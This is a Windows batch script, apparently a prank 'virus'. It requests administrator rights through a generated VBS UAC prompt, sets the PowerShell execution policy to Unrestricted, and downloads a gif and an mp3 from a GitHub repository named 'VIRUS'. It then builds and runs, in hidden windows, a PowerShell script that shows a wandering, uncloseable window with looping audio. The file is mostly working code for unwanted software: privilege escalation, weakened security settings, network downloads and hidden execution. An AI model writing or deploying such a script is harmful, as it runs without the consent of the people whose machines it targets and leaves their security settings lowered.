@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
mkdir %appdata%\ren
del /s /q %appdata%\ren
cd %appdata%\ren
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/blob/main/maxwell.gif?raw=true" -outfile "maxwell.gif"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/raw/main/maxwell.mp3" -outfile "maxwell.mp3"

echo Add-Type -AssemblyName System.Windows.Forms 																													> MAXWELLCAT.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                    >> MAXWELLCAT.ps1
echo using System;                                                                                                                                                  >> MAXWELLCAT.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> MAXWELLCAT.ps1
echo using System.Drawing;                                                                                                                                          >> MAXWELLCAT.ps1
echo public class Win32 {                                                                                                                                           >> MAXWELLCAT.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> MAXWELLCAT.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                            >> MAXWELLCAT.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> MAXWELLCAT.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                                                           >> MAXWELLCAT.ps1
echo     [DllImport("winmm.dll")]                                                                                                                                   >> MAXWELLCAT.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                                                >> MAXWELLCAT.ps1
echo }                                                                                                                                                              >> MAXWELLCAT.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> MAXWELLCAT.ps1
echo public struct MONITORINFO {                                                                                                                                    >> MAXWELLCAT.ps1
echo     public int cbSize;                                                                                                                                         >> MAXWELLCAT.ps1
echo     public RECT rcMonitor;                                                                                                                                     >> MAXWELLCAT.ps1
echo     public RECT rcWork;                                                                                                                                        >> MAXWELLCAT.ps1
echo     public int dwFlags;                                                                                                                                        >> MAXWELLCAT.ps1
echo }                                                                                                                                                              >> MAXWELLCAT.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> MAXWELLCAT.ps1
echo public struct RECT {                                                                                                                                           >> MAXWELLCAT.ps1
echo     public int Left;                                                                                                                                           >> MAXWELLCAT.ps1
echo     public int Top;                                                                                                                                            >> MAXWELLCAT.ps1
echo     public int Right;                                                                                                                                          >> MAXWELLCAT.ps1
echo     public int Bottom;                                                                                                                                         >> MAXWELLCAT.ps1
echo }                                                                                                                                                              >> MAXWELLCAT.ps1
echo ^"@                                                                                                                                                             >> MAXWELLCAT.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                                                   >> MAXWELLCAT.ps1
echo $form.Text = "MAXWELL CAT!!!!!! OwO"                                                                                                                                     >> MAXWELLCAT.ps1
echo $form.Size = New-Object Drawing.Size(400, 300)                                                                                                                 >> MAXWELLCAT.ps1
echo $form.ControlBox = $false                                                                                                                                      >> MAXWELLCAT.ps1
echo $form.StartPosition = "Manual"                                                                                                                                 >> MAXWELLCAT.ps1
echo $form.ShowInTaskbar = $false >> MAXWELLCAT.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                                                        >> MAXWELLCAT.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                                                       >> MAXWELLCAT.ps1
echo $pictureBox.Size = $form.Size                                                                                                                                  >> MAXWELLCAT.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                                                         >> MAXWELLCAT.ps1
echo $form.Controls.Add($pictureBox)                                                                                                                                >> MAXWELLCAT.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\maxwell.gif"                                                                                                            >> MAXWELLCAT.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                                              >> MAXWELLCAT.ps1
echo $pictureBox.Image = $gif                                                                                                                                       >> MAXWELLCAT.ps1
echo $mp3Path = Join-Path $env:APPDATA "ren\maxwell.mp3"                                                                                                            >> MAXWELLCAT.ps1
echo [Win32]::mciSendString("open `"${mp3Path}`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)                                                               >> MAXWELLCAT.ps1
echo [Win32]::mciSendString("play mp3 repeat", $null, 0, [IntPtr]::Zero)                                                                                            >> MAXWELLCAT.ps1
echo $moveCounter = 0                                                                                                                                               >> MAXWELLCAT.ps1
echo $mb = Get-Random -Minimum 1 -Maximum 1200 >> MAXWELLCAT.ps1
echo $ma = Get-Random -Minimum 120 -Maximum 800 >> MAXWELLCAT.ps1
echo $form.Location = New-Object System.Drawing.Point($mb, $ma) >> MAXWELLCAT.ps1
echo $mya = Get-Random -Minimum -7 -Maximum 7 >> MAXWELLCAT.ps1
echo $myb = Get-Random -Minimum -7 -Maximum 7 >> MAXWELLCAT.ps1
echo function UpdateFormLocation() {                                                                                                                                >> MAXWELLCAT.ps1
echo     $currentLocation = $form.Location                                                                                                                          >> MAXWELLCAT.ps1
echo     $monitorInfo = New-Object MONITORINFO                                                                                                                      >> MAXWELLCAT.ps1
echo     [Win32]::GetMonitorInfo([Win32]::GetDesktopWindow(), [ref]$monitorInfo) ^| Out-Null                                                                         >> MAXWELLCAT.ps1
echo     $monitorRect = $monitorInfo.rcMonitor                                                                                                                      >> MAXWELLCAT.ps1
echo     $formWidth = $form.Width                                                                                                                                   >> MAXWELLCAT.ps1
echo     $formHeight = $form.Height                                                                                                                                 >> MAXWELLCAT.ps1
echo     $newX = $currentLocation.X ^+ $mya                                                                                                                          >> MAXWELLCAT.ps1
echo     $newY = $currentLocation.Y ^+ $myb                                                                                                                          >> MAXWELLCAT.ps1
echo     $form.Location = New-Object System.Drawing.Point($newX, $newY)                                                                                             >> MAXWELLCAT.ps1
echo }                                                                                                                                                              >> MAXWELLCAT.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                                                 >> MAXWELLCAT.ps1
echo $timer.Interval = 60                                                                                                                                           >> MAXWELLCAT.ps1
echo $timer.Add_Tick({                                                                                                                                              >> MAXWELLCAT.ps1
echo     if ($moveCounter -eq 0) {                                                                                                                                  >> MAXWELLCAT.ps1
echo         UpdateFormLocation                                                                                                                                     >> MAXWELLCAT.ps1
echo     } else {                                                                                                                                                   >> MAXWELLCAT.ps1
echo         $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 1 -Maximum 101), (Get-Random -Minimum 1 -Maximum 201))                           >> MAXWELLCAT.ps1
echo         $moveCounter ^-= 1                                                                                                                                      >> MAXWELLCAT.ps1
echo     }                                                                                                                                                          >> MAXWELLCAT.ps1
echo })                                                                                                                                                             >> MAXWELLCAT.ps1
echo $timer.Start()                                                                                                                                                 >> MAXWELLCAT.ps1
echo $moveTimer = New-Object System.Windows.Forms.Timer                                                                                                             >> MAXWELLCAT.ps1
echo $moveTimer.Interval = 13500                                                                                                                                     >> MAXWELLCAT.ps1
echo $moveTimer.Add_Tick({                                                                                                                                          >> MAXWELLCAT.ps1
echo     $form.Close()                                                                                                                                              >> MAXWELLCAT.ps1
echo })                                                                                                                                                             >> MAXWELLCAT.ps1
echo $moveTimer.Start()                                                                                                                                             >> MAXWELLCAT.ps1
echo $form.ShowDialog()                                                                                                                                             >> MAXWELLCAT.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                                                  >> MAXWELLCAT.ps1
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c > wow.bat
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\MAXWELLCAT.ps1'" >> wow.bat
echo exit >> wow.bat
start /min wow.bat
timeout 7